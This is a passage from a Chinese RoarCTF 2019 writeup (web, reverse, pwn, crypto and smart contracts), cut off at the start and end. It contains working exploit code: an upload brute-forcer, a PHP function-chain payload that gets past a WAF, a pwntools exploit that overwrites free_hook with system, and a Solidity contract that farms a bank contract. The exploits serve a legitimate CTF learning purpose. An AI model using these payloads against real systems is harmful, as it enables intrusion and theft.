class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">"1234567890abcdef"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> s:</span><br><span class="line">url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc%s%s%s%s.php"</span>%(i,j,k,l)</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">print(url)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#[+]&#123;"url": "http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc7471.php", "status_code": 200, "data": "RoarCTF&#123;wm-22522494528d3de9&#125;\n"&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破到php文件，就可以直接读到flag。估计主办方有个脚本在后台一直跑改php文件。</p>
+<h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>这题首先进去发现是一个计算器的题目。</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195936-41fc8762-ef43-1.png" alt></p>
+<p>这道题是国赛的<strong>love_math</strong>的修改版，除去了长度限制，payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符，不同的是网站加了waf，需要绕过waf。首先需要绕过waf，测试发现当我们提交一些字符时，会直接403，经测试发现存在服务器存在http走私漏洞，可以用来绕waf，详情见：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195944-47438d9c-ef43-1.png" alt></p>
+<p>因为禁掉了一些字符，所以导致我们不能直接getflag，继续分析payload构造</p>
+<p>这里用到几个php几个数学函数。</p>
+<p>我们首先要构造列目录的payload，肯定要使用scandir函数，尝试构造列举根目录下的文件。scandir可以用base_convert函数构造，但是利用base_convert只能解决a<del>z的利用，因为根目录需要/符号，且不在a</del>z,所以需要hex2bin(dechex(47))这种构造方式，dechex() 函数把十进制数转换为十六进制数。hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015195959-4fb3b7ea-ef43-1.png" alt></p>
+<p>构造读取flag，使用readfile函数，paload：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))，方法类似</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200005-53caa4a6-ef43-1.png" alt></p>
+<h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>这道进去首先想到的就是任意文件下载，但是刚开始用GET方式一直什么都下载不了，连网站确定目录的图片都下不了。后来修改为post，可以了。。。</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200013-587ef510-ef43-1.png" alt></p>
+<p>尝试读取WEB-INF/web.xml发现操作flag的关键文件位置</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200029-61c63462-ef43-1.png" alt></p>
+<p>将图中base64解码即flag。</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="polyre"><a href="#polyre" class="headerlink" title="polyre"></a>polyre</h3><p>使用 deflat.py 脱去控制流平坦化，加密算法大致是：输入 48，平分 6 组，将每组 8 字节转化为 long 类型的值，对每组进行加密，先判断正负，然后将值乘 2，随后根据正负异或 0xB0004B7679FA26B3，循环 64 次，最后进行比较；按照这个逻辑写逆运算就可以了，逆运算见 depoly.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">origin = [<span class="number">0xbc8ff26d43536296</span>,</span><br><span class="line">          <span class="number">0x520100780530ee16</span>,</span><br><span class="line">          <span class="number">0x4dc0b5ea935f08ec</span>,</span><br><span class="line">          <span class="number">0x342b90afd853f450</span>,</span><br><span class="line">          <span class="number">0x8b250ebcaa2c3681</span>,</span><br><span class="line">          <span class="number">0x55759f81a2c68ae4</span>]</span><br><span class="line">key = <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> origin:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">64</span>):</span><br><span class="line">        tail = value &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tail == <span class="number">1</span>:</span><br><span class="line">            value = value ^ key</span><br><span class="line">        value = value // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> tail == <span class="number">1</span>:</span><br><span class="line">            value = value | <span class="number">0x8000000000000000</span></span><br><span class="line">        <span class="comment">#print(hex(value))</span></span><br><span class="line">    <span class="comment"># end for</span></span><br><span class="line">    print(hex(value))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (j &lt; <span class="number">8</span>):</span><br><span class="line">        data += chr(value &amp; <span class="number">0xFF</span>)</span><br><span class="line">        value = value &gt;&gt; <span class="number">8</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="comment"># end while</span></span><br><span class="line"><span class="comment">#end for</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200039-67dcffc0-ef43-1.png" alt></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ez-op"><a href="#ez-op" class="headerlink" title="ez_op"></a>ez_op</h3><p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08051C60</span></span><br><span class="line">hook_free = <span class="number">0x080E09F0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcdoe</span></span><br><span class="line">opcode = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get stack_addr</span></span><br><span class="line">opcode += <span class="string">"""\</span></span><br><span class="line"><span class="string">push 5</span></span><br><span class="line"><span class="string">stack_load\</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub hook_free</span></span><br><span class="line">opcode += <span class="string">f"""\</span></span><br><span class="line"><span class="string">push <span class="subst">&#123;hook_free&#125;</span></span></span><br><span class="line"><span class="string">sub\ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># value / 4 + 1</span></span><br><span class="line">opcode += <span class="string">"""\</span></span><br><span class="line"><span class="string">push 4</span></span><br><span class="line"><span class="string">div</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">add\</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *hook_free = system_addr</span></span><br><span class="line">opcode += <span class="string">f"""\</span></span><br><span class="line"><span class="string">push <span class="subst">&#123;system_addr&#125;</span></span></span><br><span class="line"><span class="string">stack_set\</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">opcode = <span class="string">f"""\</span></span><br><span class="line"><span class="string">push <span class="subst">&#123;<span class="number">0x6e69622f</span>&#125;</span></span></span><br><span class="line"><span class="string">push <span class="subst">&#123;<span class="number">0x68732f</span>&#125;</span></span></span><br><span class="line"><span class="string">push <span class="subst">&#123;system_addr&#125;</span></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">push 4</span></span><br><span class="line"><span class="string">push 64</span></span><br><span class="line"><span class="string">stack_load</span></span><br><span class="line"><span class="string">push <span class="subst">&#123;hook_free&#125;</span></span></span><br><span class="line"><span class="string">sub</span></span><br><span class="line"><span class="string">div</span></span><br><span class="line"><span class="string">sub</span></span><br><span class="line"><span class="string">stack_set\</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">OPCODET = &#123;</span><br><span class="line">  <span class="string">"push"</span>: <span class="number">0x2a3d</span>,</span><br><span class="line">  <span class="string">"add"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">"sub"</span>: <span class="number">0x11111</span>,</span><br><span class="line">  <span class="string">"div"</span>: <span class="number">0x514</span>,</span><br><span class="line">  <span class="string">"stack_set"</span>: <span class="number">0x10101010</span>,</span><br><span class="line">  <span class="string">"stack_load"</span>: <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line">opcode_list = opcode.split(<span class="string">"\n"</span>)</span><br><span class="line">op_result = []</span><br><span class="line">num_result = []</span><br><span class="line"><span class="keyword">for</span> op <span class="keyword">in</span> opcode_list:</span><br><span class="line">  tmp = op.split(<span class="string">" "</span>)</span><br><span class="line">  <span class="keyword">assert</span> tmp[<span class="number">0</span>] <span class="keyword">in</span> OPCODET</span><br><span class="line">  op_result.append(str(OPCODET[tmp[<span class="number">0</span>]]))</span><br><span class="line">  <span class="keyword">if</span> len(tmp) == <span class="number">2</span>:</span><br><span class="line">      num_result.append(str(tmp[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">result_op = <span class="string">" "</span>.join(op_result)</span><br><span class="line">result_num = <span class="string">" "</span>.join(num_result)</span><br><span class="line"></span><br><span class="line">print(result_op)</span><br><span class="line">print(result_num)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200049-6e068fba-ef43-1.png" alt></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>一个数学结论：对于一个素数p来说，（p-1）的阶乘加上（p-2）的阶乘等于p乘以（p-2）的阶乘,能被p整除,（p-1）的阶乘除以p余p-1（因为p的阶乘能被p整除）就是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(p-1)!+(p-2)!&#x3D;p*(p-2)  </span><br><span class="line">(p-1)!&#x3D;p*(p-1)</span><br><span class="line">(p-2)! % p&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>解密脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a,m)</span>:</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">" error"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">a1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">b1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class="line">a2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">b2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">c=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line">p=<span class="number">1</span></span><br><span class="line">q=<span class="number">1</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">l=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(b1+<span class="number">1</span>,a1<span class="number">-1</span>):</span><br><span class="line">    p *= modinv(i,a1)</span><br><span class="line">    p %=a1</span><br><span class="line">p=sympy.nextprime(p)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p="</span></span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(b2+<span class="number">1</span>,a2<span class="number">-1</span>):</span><br><span class="line">    q *=modinv(i,a2)</span><br><span class="line">    q %=a2</span><br><span class="line">q=sympy.nextprime(q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q="</span></span><br><span class="line"><span class="keyword">print</span> q</span><br><span class="line">r=n/q/p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"r="</span></span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(r<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fn="</span></span><br><span class="line"><span class="keyword">print</span> fn</span><br><span class="line">e=<span class="number">4097</span></span><br><span class="line">d=modinv(e,fn)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"d="</span></span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m="</span></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200058-731162d2-ef43-1.png" alt></p>
+<h3 id="区块链1"><a href="#区块链1" class="headerlink" title="区块链1"></a>区块链1</h3><p>做题的时候发现已经有人做出来了，然后去看做出来人的交易记录，发现是薅羊毛，通过逆向做出来人的记录，照抄了一个，payload合约如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">*Submitted for verification at Etherscan.io on 2019-10-08</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract P_Bank</span><br><span class="line">&#123;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line">   </span><br><span class="line">  uint public MinDeposit &#x3D; 0.1 ether;</span><br><span class="line">   </span><br><span class="line">  Log TransferLog;</span><br><span class="line">  event FLAG(string b64email, string slogan);</span><br><span class="line">  constructor(address _log) public &#123; </span><br><span class="line">      TransferLog &#x3D; Log(_log);</span><br><span class="line">    &#125;</span><br><span class="line">  function Ap() public &#123;</span><br><span class="line">      if(balances[msg.sender] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">          balances[msg.sender]+&#x3D;1 ether;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function Transfer(address to, uint val) public &#123;</span><br><span class="line">      if(val &gt; balances[msg.sender]) &#123;</span><br><span class="line">          revert();</span><br><span class="line">      &#125;</span><br><span class="line">      balances[to]+&#x3D;val;</span><br><span class="line">      balances[msg.sender]-&#x3D;val;</span><br><span class="line">  &#125;</span><br><span class="line">  function CaptureTheFlag(string b64email) public returns(bool)&#123;</span><br><span class="line">    require (balances[msg.sender] &gt; 500 ether);</span><br><span class="line">    emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  function Deposit()</span><br><span class="line">  public</span><br><span class="line">  payable</span><br><span class="line">  &#123;</span><br><span class="line">      if(msg.value &gt; MinDeposit)</span><br><span class="line">      &#123;</span><br><span class="line">          balances[msg.sender]+&#x3D; msg.value;</span><br><span class="line">          TransferLog.AddMessage(msg.sender,msg.value,&quot;Deposit&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  function CashOut(uint _am) public </span><br><span class="line">  &#123;</span><br><span class="line">      if(_am&lt;&#x3D;balances[msg.sender])</span><br><span class="line">      &#123;</span><br><span class="line">           </span><br><span class="line">          if(msg.sender.call.value(_am)())</span><br><span class="line">          &#123;</span><br><span class="line">              balances[msg.sender]-&#x3D;_am;</span><br><span class="line">              TransferLog.AddMessage(msg.sender,_am,&quot;CashOut&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  function() public payable&#123;&#125;    </span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Log </span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  struct Message</span><br><span class="line">  &#123;</span><br><span class="line">      address Sender;</span><br><span class="line">      string Data;</span><br><span class="line">      uint Val;</span><br><span class="line">      uint Time;</span><br><span class="line">  &#125;</span><br><span class="line">  string err &#x3D; &quot;CashOut&quot;;</span><br><span class="line">  Message[] public History;</span><br><span class="line">  Message LastMsg;</span><br><span class="line">  function AddMessage(address _adr,uint _val,string _data)</span><br><span class="line">  public</span><br><span class="line">  &#123;</span><br><span class="line">      LastMsg.Sender &#x3D; _adr;</span><br><span class="line">      LastMsg.Time &#x3D; now;</span><br><span class="line">      LastMsg.Val &#x3D; _val;</span><br><span class="line">      LastMsg.Data &#x3D; _data;</span><br><span class="line">      History.push(LastMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract FatherOwned &#123;</span><br><span class="line">  address owner;</span><br><span class="line">  modifier onlyOwner&#123; if (msg.sender !&#x3D; owner) revert(); _; &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack</span><br><span class="line">&#123;</span><br><span class="line">  address owner;</span><br><span class="line">  P_Bank target;</span><br><span class="line">  constructor(address my) public &#123; </span><br><span class="line">      owner &#x3D; my;</span><br><span class="line">      target &#x3D; P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);</span><br><span class="line">      target.Ap();</span><br><span class="line">      target.Transfer(owner, 1 ether);</span><br><span class="line">      selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Deploy is FatherOwned</span><br><span class="line">&#123;</span><br><span class="line">  constructor() public &#123; </span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function getflag() public onlyOwner &#123;</span><br><span class="line">        P_Bank target;</span><br><span class="line">        target &#x3D; P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);</span><br><span class="line">        target.CaptureTheFlag(&quot;baiyjrh@gmail.com&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function ffhhhhhhtest1() public onlyOwner &#123;</span><br><span class="line">    uint i;</span><br><span class="line">    for (i&#x3D;0; i&lt;10; i++)&#123;</span><br><span class="line">        new Attack(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function ffhhhhhhtest2() public onlyOwner &#123;</span><br><span class="line">    uint i;</span><br><span class="line">    for (i&#x3D;0; i&lt;30; i++)&#123;</span><br><span class="line">        new Attack(owner);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    function ffhhhhhhtest3() public onlyOwner &#123;</span><br><span class="line">    uint i;</span><br><span class="line">    for (i&#x3D;0; i&lt;50; i++)&#123;</span><br><span class="line">        new Attack(owner);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function ffhhhhhhtest4() public onlyOwner &#123;</span><br><span class="line">    uint i;</span><br><span class="line">    for (i&#x3D;0; i&lt;70; i++)&#123;</span><br><span class="line">        new Attack(owner);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="智能合约2"><a href="#智能合约2" class="headerlink" title="智能合约2"></a>智能合约2</h3><p>给的源码和实际的不一样，同样了看了下之前做出来的人的交易，发现了一个函数：0x5ad0ae39</p>
+<p>逆向一下得到大概代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">func 0x5ad0ae39(address1, address2, uint, address3)</span><br><span class="line">  require(allowance[address1][msg.sender] &gt;&#x3D; uint)</span><br><span class="line">  require(address3 &#x3D;&#x3D; msg.sender + 0x32c3edb)</span><br><span class="line">  balanceOf[address1] -&#x3D; _value;</span><br><span class="line">  balanceOf[address2] +&#x3D; _value;</span><br><span class="line">  allowance[address1][msg.sender] -&#x3D; _value;</span><br><span class="line">然后在标准token的sol里面有一个函数：</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool) &#123;</span><br><span class="line">  allowed[msg.sender][_spender] &#x3D; _value;</span><br><span class="line">  Approval(msg.sender, _spender, _value);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过approve函数给allowance[msg.sender][msg.sender]赋值，随便大于1000的值就行。</p>
+<p>然后调用0x5ad0ae39，这里就比较蛋疼了，因为爆破不出这个函数名，没法直接用remix做题，没办法只能写代码了。</p>
+<p>过程如图：</p>
+<p><img src="/2019/10/27/RoarCTF2019-Writeup/20191015200656-48c92072-ef44-1.png" alt></p>
+<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>根据题目文件可知：</p>
